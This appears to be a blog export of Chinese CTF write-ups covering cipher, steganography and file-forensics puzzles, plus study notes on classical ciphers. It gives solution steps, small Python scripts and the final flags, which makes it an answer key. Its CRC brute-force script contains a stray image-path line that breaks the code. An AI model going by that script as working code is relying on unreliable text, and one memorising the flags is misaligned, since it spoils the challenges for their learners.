<strong>解题思路：</strong> 打开图片，发现是猪圈密码，圣堂武士密码，标准银河字母，对照密码表解密，</p>
<p><img src="https://img-blog.csdnimg.cn/20200330151605266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="银河字母" /><br />
<img src="https://img-blog.csdnimg.cn/20200330151706353.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /><br />
<img src="https://img-blog.csdnimg.cn/2020033015173771.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
<p><img src="https://img-blog.csdnimg.cn/20200330151920190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
<p>得到FGCPFLIRTUASYON，图中提到栅栏，想到栅栏密码。当每组数字为3时，得到FLAGISCRYPTOFUN，故flag为MRCTF{CRYPTOFUN}</p>
<h2 id="天干地支甲子"><a class="markdownIt-Anchor" href="#天干地支甲子"></a> 天干地支+甲子</h2>
<p><strong>题目：</strong> 我是精通周易的旷世奇才。<br />
<strong>解题思路：</strong> 根据天干地支纪年法找到txt中所给组合的数字编码，然后分别加上60，转换成ASSII码，得到flag。<br />
<img src="https://img-blog.csdnimg.cn/20200330151952428.PNG#pic_center" alt="在这里插入图片描述" /></p>
<h2 id="keyboard"><a class="markdownIt-Anchor" href="#keyboard"></a> keyboard</h2>
<p><strong>题目：</strong>  你很了解这个🐎？？？<br />
<strong>解题思路：</strong>  根据题目想到键盘密码，打开txt，发现全是数字，想到九键，每一行的数字个数对应该数字下字母的位置，得到mobilephone，故flag为MRCTF{mobilephone}。</p>
<h2 id="vigenere"><a class="markdownIt-Anchor" href="#vigenere"></a> vigenere</h2>
<p><strong>题目：</strong>  听说你很会密码。<br />
<strong>解题思路：</strong>  由题目可知是维多尼亚密码，在线解密TXT中的内容，可以发现最后一段提示flag，加上下划线，大括号即可。</p>
<p><img src="https://img-blog.csdnimg.cn/20200330152014837.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /><br />
由题目可知是维多尼亚密码，在线解密TXT中的内容，可以发现最后一段提示flag，加上下划线，大括号即可。mrctf{vigenere_crypto_crack_man}。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF 2nd writeup(二)</title>
    <url>/CTF/writeup05/</url>
    <content><![CDATA[<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1>
<h2 id="bjdctf-2nda_beautiful_picture"><a class="markdownIt-Anchor" href="#bjdctf-2nda_beautiful_picture"></a> [BJDCTF 2nd]A_Beautiful_Picture</h2>
<p><strong>题目：</strong>  得到的 flag 建议用 flag{} 包上提交。<br />
<strong>解题思路：</strong>  将图片放到kali中，发现报crc错误</p>
<p><img src="https://img-blog.csdnimg.cn/20200329084749597.PNG#pic_center" alt="在这里插入图片描述" /></p>
<p>直接上脚本爆破，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">filename = <span class="string">'Misc-A_Beautiful_Picture-DreamerJack.png'</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = int(all_b[<span class="number">29</span>:<span class="number">33</span>].hex(),<span class="number">16</span>)</span><br><span class="line">  ![<span class="number">2</span>](C:\Users\daiqi\Desktop\writeupImages\<span class="number">2.</span>PNG)  data = bytearray(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>            </span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> range(n):          <span class="comment">#高和宽一起爆破</span></span><br><span class="line">        width = bytearray(struct.pack(<span class="string">'&gt;i'</span>, w))     </span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> range(n):</span><br><span class="line">            height = bytearray(struct.pack(<span class="string">'&gt;i'</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                print(<span class="string">"宽为："</span>,end=<span class="string">""</span>)</span><br><span class="line">                print(width)</span><br><span class="line">                print(<span class="string">"高为："</span>,end=<span class="string">""</span>)</span><br><span class="line">                print(height)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>得宽高为：</p>
<p><img src="https://img-blog.csdnimg.cn/2020032908480919.PNG#pic_center" alt="在这里插入图片描述" /><br />
修改高度，得到flag<br />
<img src="https://img-blog.csdnimg.cn/20200329084826986.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
<h2 id="bjdctf-2nd小姐姐-y1ng"><a class="markdownIt-Anchor" href="#bjdctf-2nd小姐姐-y1ng"></a> [BJDCTF 2nd]小姐姐-y1ng</h2>
<p><strong>题目：</strong>  你就是馋她身子，得到的 flag 建议用 flag{} 包上提交。<br />
<strong>解题思路：</strong>  仔细观察图片，图片出现了错位，猜测中间被插入flag，用notepad++打开图片，搜索ctf，未找到flag，在搜索BJD，发现flag。（提醒：编码需选择UTF-8，不然找不到，别问我为啥知道o(╥﹏╥)o）。<br />
<img src="https://img-blog.csdnimg.cn/20200329084844590.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
<h2 id="bjdctf-2ndtargz-y1ng"><a class="markdownIt-Anchor" href="#bjdctf-2ndtargz-y1ng"></a> [BJDCTF 2nd]TARGZ-y1ng</h2>
<p><strong>题目：</strong>  哎？ 我的tar zxvf怎么不好使了？解压密码不需要爆破，得到的 flag 建议用 flag{} 包上提交。<br />
<strong>解题思路：</strong> kali中打开，发现报错，用file命令查看文件类型，发现是zip，修改后缀名，题中提示密码不需爆破，尝试文件名，解压成功，发现其中还是压缩文件，典型的套娃，写脚本爆破即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile,os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unzip</span><span class="params">(zipname)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        passwd = zipname.split(<span class="string">'.'</span>)[<span class="number">0</span>]</span><br><span class="line">        zf = zipfile.ZipFile(zipname,<span class="string">'r'</span>)</span><br><span class="line">        zf.extractall(pwd=passwd.encode())</span><br><span class="line">        os.remove(zipname)</span><br><span class="line">        zipname = zf.namelist()[<span class="number">0</span>]</span><br><span class="line">        zf.close()</span><br><span class="line">unzip(<span class="string">"OKMIlLVft.tar.gz"</span>)</span><br></pre></td></tr></table></figure>
<p>得到flag，BJD{wow_you_can_rea11y_dance}。</p>
<h2 id="bjdctf-2ndimagin-开场曲"><a class="markdownIt-Anchor" href="#bjdctf-2ndimagin-开场曲"></a> [BJDCTF 2nd]Imagin - 开场曲</h2>
<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1>
<h2 id="bjdctf-2ndcat_flag"><a class="markdownIt-Anchor" href="#bjdctf-2ndcat_flag"></a> [BJDCTF 2nd]cat_flag</h2>
<p><strong>题目：</strong> 得到的 flag 建议用 flag{} 包上提交。<br />
<strong>解题思路：</strong>  图中每行有8只猫，总共有两种猫，猜测为二进制ASCII码，二进制转换成字符串即可。BJD{M!a0~}。</p>
<h2 id="bjdctf-2nd燕言燕语"><a class="markdownIt-Anchor" href="#bjdctf-2nd燕言燕语"></a> [BJDCTF 2nd]燕言燕语</h2>
<p><strong>题目：</strong> 小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说:<br />
79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20<br />
<strong>解题思路：</strong> 明显是16进制数据，转字符，得yanzi ZJQ{xilzv_iqssuhoc_suzjg} ，猜测是维吉尼亚密码，yanzi是密钥解密，得到flag。BJD{yanzi_jiushige_shabi}</p>
<h2 id="燕言燕语"><a class="markdownIt-Anchor" href="#燕言燕语"></a> 燕言燕语</h2>
<p><strong>题目：</strong> Y1ng根据English居然独自发明了一门语言，就叫Y1nglish。明文都是可读的英文单词，flag如果提交失败，自己读一下，把错误的单词修正，再提交(某个地方的u和i不需要调换顺序，错误点不在那里)。得到的 flag 建议用 flag{} 包上提交。<br />
<strong>解题思路：</strong> 明显需要用到cryptogram solver，用quipqiup破解<br />
地址：<a href="https://www.quipqiup.com/" target="_blank" rel="noopener">https://www.quipqiup.com/</a><br />
得到BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}，根据提示将Cr4cy改成Cr4ck即可。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF 2nd writeup</title>
    <url>/CTF/writeup04/</url>
    <content><![CDATA[<h1 id="bjdctf-2nd签到-y1ng"><a class="markdownIt-Anchor" href="#bjdctf-2nd签到-y1ng"></a> [BJDCTF 2nd]签到-y1ng</h1>
<p><strong>题目：</strong> QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==<br />
<strong>解题思路：</strong> 直接base64解码即可。BJD{W3lc0me_T0_BJDCTF}</p>
<h1 id="bjdctf-2nd灵能精通-y1ng"><a class="markdownIt-Anchor" href="#bjdctf-2nd灵能精通-y1ng"></a> [BJDCTF 2nd]灵能精通-y1ng</h1>
<p><strong>题目：</strong>  身经百战的Y1ng已经达到崇高的武术境界，以自律克己来取代狂热者的战斗狂怒与传统的战斗形式。Y1ng所受的训练也进一步将他们的灵能强化到足以瓦解周遭的物质世界。借由集中这股力量，Y1ng能释放灵能能量风暴来摧毁敌人的心智、肉体与器械。<br />
<strong>解题思路：</strong>  为下载得到的jpg添加后缀.jpg,得到图片<br />
<img src="https://img-blog.csdnimg.cn/20200323201624449.jpg" alt="在这里插入图片描述" /><br />
观察图片，可以知道是猪圈密码，解密即可。</p>
<p>flag{IMKNIGHTSTEMPLAR}。</p>
<h1 id="bjdctf-2ndreal_easybaba"><a class="markdownIt-Anchor" href="#bjdctf-2ndreal_easybaba"></a> [BJDCTF 2nd]Real_EasyBaBa</h1>
<p><strong>题目：</strong>  得到的 flag 建议用 flag{} 包上提交。<br />
<strong>解题思路：</strong><br />
<img src="https://img-blog.csdnimg.cn/20200323201657316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
<p>用winhex查看图片发现<br />
<img src="https://img-blog.csdnimg.cn/20200323201737862.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
<p>BJD{572154976}。</p>
<h1 id="bjdctf-2nd圣火昭昭-y1ng"><a class="markdownIt-Anchor" href="#bjdctf-2nd圣火昭昭-y1ng"></a> [BJDCTF 2nd]圣火昭昭-y1ng</h1>
<p><strong>题目：</strong>  开局一张图，flag全靠猜，因为出题人失误搞错了，解出来的key去掉后3位的com。<br />
<strong>解题思路：</strong> 查看图片属性，发现新佛曰<br />
<img src="https://img-blog.csdnimg.cn/20200323201829383.PNG#pic_center" alt="在这里插入图片描述" /></p>
<p>解密地址 ：<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">http://hi.pcmoe.net/buddha.html</a></p>
<p><img src="https://img-blog.csdnimg.cn/20200323201906983.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
<p>得到gemlovecom，去掉“com”提交，发现incorrect，想到题目中的“猜”，联想到Outguess隐写，在Kali下运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outguess -k <span class="string">'gemlove'</span> -r <span class="string">'/root/桌面/1.jpg'</span> -t 11.txt</span><br></pre></td></tr></table></figure>
<p>得到flag，BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}。</p>
<h1 id="bjdctf-2nd最简单的misc-y1ng"><a class="markdownIt-Anchor" href="#bjdctf-2nd最简单的misc-y1ng"></a> [BJDCTF 2nd]最简单的misc-y1ng</h1>
<p><strong>题目：</strong>  得到的 flag 建议用 flag{} 包上提交。<br />
<strong>解题思路：</strong> 查看secret的十六进制表示，发现是缺少文件头的png，插入png文件头89 50 4e 47 ，添加后缀名.png,得到图片</p>
<p><img src="https://img-blog.csdnimg.cn/20200323202015469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /><br />
观察图中是十六进制数据，转换成字符即可。</p>
<p><img src="https://img-blog.csdnimg.cn/20200323202049404.PNG#pic_center" alt="在这里插入图片描述" /></p>
<h1 id="bjdctf-2ndeasybaba"><a class="markdownIt-Anchor" href="#bjdctf-2ndeasybaba"></a> [BJDCTF 2nd]EasyBaBa</h1>
<p><strong>题目：</strong>  得到的 flag 建议用 flag{} 包上提交。<br />
<strong>解题思路：</strong> 用binwalk查看图片</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk ezbb.jpg</span><br></pre></td></tr></table></figure>
<p>发现压缩文件，foremost分离文件，打开zip，里面有一张图片，查看其十六进制形式，发现是avi格式，更改后缀名，打开发现该视频中有4个二维码，扫描得到一串十六进制数字424a447b696d6167696e5f6c6f76655f59316e677d<br />
转换成字符即得flag，BJD{imagin_love_Y1ng}。</p>
<h1 id="bjdctf-2nd老文盲了"><a class="markdownIt-Anchor" href="#bjdctf-2nd老文盲了"></a> [BJDCTF 2nd]老文盲了</h1>
<p><strong>题目：</strong>  BJD{这里是中文} 。<br />
<strong>解题思路：</strong><br />
打开文本发现“罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝”，百度一下每个字的读音，发现他们的谐音是：bjd{这就是flag直接交了吧}，故直接将“淛匶襫黼瀬鎶軄鶛驕鳓哵”提交即可。BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}。</p>
<p>黼瀬鎶軄鶛驕鳓哵”提交即可。BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>WhaleCTF-隐写术writeup</title>
    <url>/CTF/writeup03/</url>
    <content><![CDATA[<h2 id="下雨天"><a class="markdownIt-Anchor" href="#下雨天"></a> 下雨天</h2>
<p><strong>题目：</strong> 答案格式：GUETCTF{flag}，flag是解密内容。<br />
<strong>解题思路：</strong> 题中图片</p>
<p><img src="https://img-blog.csdnimg.cn/20200320104735621.jpg#pic_center#=200x" alt="在这里插入图片描述" /><br />
用notepad++打开图片，发现该图片是gif</p>
<p><img src="https://img-blog.csdnimg.cn/20200320105051510.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center#=400x" alt="在这里插入图片描述" /></p>
<p>更改后缀名，用StegSolve打开，使用Frame Browser帧浏览功能进行分解，得到flag。</p>
<p><img src="https://img-blog.csdnimg.cn/20200320105155729.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center#=200x" alt="在这里插入图片描述" /></p>
<h2 id="分解2"><a class="markdownIt-Anchor" href="#分解2"></a> 分解2</h2>
<p><strong>题目：</strong> 提交格式是flag{xxxx},所以答案是？<br />
<strong>解题思路：</strong> 题中图片<br />
<img src="https://img-blog.csdnimg.cn/20200320105506326.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center#=200x" alt="在这里插入图片描述" /></p>
<p>根据题目分解，可以联想到文件提取，用kali下的binwalk查看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk 03-mm-easy.jpg</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200320105557910.PNG#pic_center" alt="在这里插入图片描述" /></p>
<p>再用foremost提取图片,得到flag。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foremost 03-mm-easy.jpg</span><br></pre></td></tr></table></figure>
<h2 id="分解3"><a class="markdownIt-Anchor" href="#分解3"></a> 分解3</h2>
<p>与上一题相似，这里就不在重复书写解题思路。</p>
<h2 id="女神"><a class="markdownIt-Anchor" href="#女神"></a> 女神</h2>
<p><strong>题目：</strong> 女神的头发里好像有东西！答案格式：nctf{flag}，flag是解密内容。<br />
<strong>解题思路：</strong> 题中图片<br />
<img src="https://img-blog.csdnimg.cn/20200320110029717.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center#=200x" alt="在这里插入图片描述" /><br />
notepad++打开在最下面发现flag</p>
<p><img src="https://img-blog.csdnimg.cn/20200320105710119.PNG#pic_center" alt="在这里插入图片描述" /></p>
<h2 id="捉迷藏"><a class="markdownIt-Anchor" href="#捉迷藏"></a> 捉迷藏</h2>
<p><strong>题目：</strong> 你找不到我的~答案格式：key{flag}，flag是解密内容。<br />
<strong>解题思路：</strong><br />
用StegSolve打开图片，逐图层查看，发现flag。</p>
<p><img src="https://img-blog.csdnimg.cn/20200320105737255.PNG#pic_center#=200x" alt="在这里插入图片描述" /></p>
<h2 id="word隐写"><a class="markdownIt-Anchor" href="#word隐写"></a> word隐写</h2>
<p><strong>题目：</strong> 答案格式：venusctf{flag}，flag是解密内容。<br />
<strong>解题思路：</strong><br />
添加后缀名.docx，打开文档，发现文中《锦带书十二月启·林锺六月》的每一行均未显示第一个字，将其字体更改为红色，但是，这些字不是flag。<br />
将选项中的隐藏文字勾选，<br />
<img src="https://img-blog.csdnimg.cn/2020032010581536.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center#=400x" alt="在这里插入图片描述" /></p>
<p>发现flag。</p>
<p><img src="https://img-blog.csdnimg.cn/20200320105854220.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center#=200x" alt="在这里插入图片描述" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>WhaleCTF-隐写术 彩虹的声音</title>
    <url>/CTF/writeup02/</url>
    <content><![CDATA[<p><strong>题目</strong>：风雨过后就会见到彩虹的，答案格式是key{xxxx}，所以答案是？<br />
<strong>解题思路</strong>：用Audacity打开音频文件，观察波形，选择用频谱图查看<img src="https://img-blog.csdnimg.cn/20200318151223353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" /><br />
得到flag<br />
<img src="https://img-blog.csdnimg.cn/20200318151300105.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Whale-隐写术 分解1</title>
    <url>/CTF/writeup01/</url>
    <content><![CDATA[<h2 id="分解1"><a class="markdownIt-Anchor" href="#分解1"></a> 分解1</h2>
<pre><code>题目：答案的格式是sctf{xxxxx}，所以答案是
</code></pre>
<p>解题思路：打开题中图片<img src="https://img-blog.csdnimg.cn/20200318094204424.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" /><br />
根据题目分解，可以联想到文件提取，用kali下的binwalk查看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e 02-carter.jpg</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200318094517646.PNG" alt="在这里插入图片描述" /><br />
发现其中隐藏一张图片，再用foremost分解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foremost 02-carter.jpg -o 1</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200318094805469.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" /><br />
得到flag。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-隐写术 学习笔记</title>
    <url>/CTF/%E9%9A%90%E5%86%99%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="ctf-隐写术"><a class="markdownIt-Anchor" href="#ctf-隐写术"></a> CTF-隐写术</h1>
<p>隐写术是关于信息隐藏，即不让计划的接受者之外的任何人知道信息的传递事件（不只是信息的内容）的一门技巧与科学。</p>
<h2 id="常用文件头文件尾"><a class="markdownIt-Anchor" href="#常用文件头文件尾"></a> 常用文件头，文件尾</h2>
<ul>
<li>JPEG(jpg),      文件头：FF D8 FF                     文件尾：FF D9</li>
<li>PNG(png),     文件头：89 50 4E 47               文件尾：AE 42 60 82</li>
<li>GIF(gif),          文件头：47 49 46 38               文件尾：00 3B</li>
<li>ZIP(zip),         文件头：50 4B 03 04               文件尾：50 4B</li>
<li>TIFIF(tif),        文件头：49 49 2A 00</li>
<li>RAR(rar),       文件头：52 61 72 21</li>
</ul>
<h2 id="图片隐写"><a class="markdownIt-Anchor" href="#图片隐写"></a> 图片隐写</h2>
<ol>
<li>
<p>Exif：一种图像文件格式，就是在JPEG格式头部插入了数码照片的信息。（Kali中exif命令查看参数）。</p>
</li>
<li>
<p>文件隐藏：用压缩软件将需要隐藏的文件压缩成zip或rar格式，以zip为例，压缩好后重命名，在准备一张jpg格式图片，在cmd下执行命令<br />
copy D:\1.jpg+D:\2.zip D:\3.jpg</p>
</li>
<li>
<p>文件提取：Kali里用binwalk -e 提取已知文件类型。foremost 分离文件。</p>
</li>
<li>
<p>LSB隐写：将秘密信息嵌入到载体图像像素值的最低有效位，也称最不显著位，这一位置是图像最不重要的像素位。</p>
</li>
</ol>
<h2 id="apk"><a class="markdownIt-Anchor" href="#apk"></a> apk</h2>
<ol>
<li>查看：将后缀名改为zip。</li>
<li>flag通常放在res文件夹下，不考虑layout文件夹。</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-密码学知识学习笔记</title>
    <url>/CTF/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    <content><![CDATA[<h1 id="古典密码学"><a class="markdownIt-Anchor" href="#古典密码学"></a> 古典密码学</h1>
<h2 id="单表替换"><a class="markdownIt-Anchor" href="#单表替换"></a> 单表替换</h2>
<h3 id="简单介绍"><a class="markdownIt-Anchor" href="#简单介绍"></a> 简单介绍</h3>
<ul>
<li>特点：明文和密文一一对应。</li>
<li>密钥空间小的情况下，暴力破解。</li>
<li>密文足够长的时候，采用词频分析。</li>
<li>特征：一般只能加密字母，不会加密特殊符号，且不会变换字母顺序，加密过后大概率第四或第五位为“{”。</li>
</ul>
<h3 id="常见单表替换密码"><a class="markdownIt-Anchor" href="#常见单表替换密码"></a> 常见单表替换密码</h3>
<ol>
<li>凯撒密码(Caesar)：按照字母表顺序向前（后）移动固定数目；<br />
在线加解密：<a href="http://planetcalc.com/1434/" target="_blank" rel="noopener">http://planetcalc.com/1434/</a></li>
<li>ROT13：特殊的凯撒密码；</li>
<li>埃特巴什码(Atbash Cipher)：第一个字母对应最后一个字母，第二个对应倒数第二个；</li>
<li>简单替换密码：替换密码表没有规律，利用词频分析破解；</li>
<li>仿射密码：通过数学函数建立字母映射（一元一次函数）；</li>
<li>培根密码 (Baconian Cipher )：每个明文字母被一个由5字符(a,b)组成的序列替换。<br />
在线加解密：<a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/baconian.php</a><br />
通常查表直接解：<br />
<a href="http://blog.csdn.net/qq_39455664/article/details/78344952" target="_blank" rel="noopener">http://blog.csdn.net/qq_39455664/article/details/78344952</a></li>
</ol>
<h2 id="多表替换"><a class="markdownIt-Anchor" href="#多表替换"></a> 多表替换</h2>
<h3 id="简单介绍-2"><a class="markdownIt-Anchor" href="#简单介绍-2"></a> 简单介绍</h3>
<ul>
<li>特点：明文和密文不在一一对应。</li>
<li>基本不能用词频分析。</li>
</ul>
<h3 id="常见多表替换密码"><a class="markdownIt-Anchor" href="#常见多表替换密码"></a> 常见多表替换密码</h3>
<ol>
<li>维吉尼亚密码(Vigenere) ：使用一系列凯撒密码组成密码字母表的加密算法，行对应明文，列对应密钥；</li>
<li>棋盘密码(Polybius)：一般是将给定的明文加密为两两组合的数字（或ADFGX），例，明文HELLO，加密后23 15 31 31 34。</li>
</ol>
<h2 id="其它密码"><a class="markdownIt-Anchor" href="#其它密码"></a> 其它密码</h2>
<ol>
<li>栅栏密码：明文分成n个一组，取每组的第i个字组成第i段密文，最后将多段组合在一起，栅栏的栏数就是分组个数；</li>
<li>猪圈密码(Pigpen)：别称朱高密码、共济会密码、九宫格密码，一格子为基础的简单替代式密码。在线加解密：<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html" target="_blank" rel="noopener">http://www.simonsingh.net/The_Black_Chamber/pigpen.html</a></li>
<li>云影密码：01248密码，用01248四个数字，其中 0 用来表示间隔，其他数字以加法可以表示出 如：28=10，124=7，18=9，再用 1-&gt;26 表示 A-&gt;Z。</li>
<li>摩斯密码：摩尔斯电码（又译为摩斯密码，Morse code）是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。只有.（点）和-（划）<br />
在线加解密：<a href="https://www.bejson.com/enc/morse/" target="_blank" rel="noopener">https://www.bejson.com/enc/morse/</a></li>
<li>JSFuck： JSFuck 可以只用 6 个字符 !+ 来编写 JavaScript 程序。<br />
在线加解密：<a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a></li>
<li>BrainFuck和ook：是一种极小化的计算机语言。<br />
在线加解密：<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></li>
</ol>
